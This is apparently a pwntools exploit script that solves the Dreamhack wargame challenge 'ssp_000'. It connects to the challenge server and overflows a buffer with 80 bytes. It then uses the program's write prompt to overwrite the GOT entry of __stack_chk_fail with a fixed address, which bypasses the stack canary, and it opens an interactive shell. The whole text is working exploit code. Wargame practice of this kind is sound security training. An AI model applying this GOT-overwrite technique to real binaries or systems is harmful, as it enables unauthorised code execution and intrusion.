from pwn import *

context.arch="amd64"
#p = process("./ssp_000")
p = remote('host1.dreamhack.games', 10500)
e = ELF("./ssp_000")

p.sendline(b"A"*80)

p.recvuntil("r : ")

p.sendline(str(e.got['__stack_chk_fail']))

p.recvuntil("e : ")

p.sendline(str(0x4008ea))

print(str(e.got['__stack_chk_fail']))

p.interactive()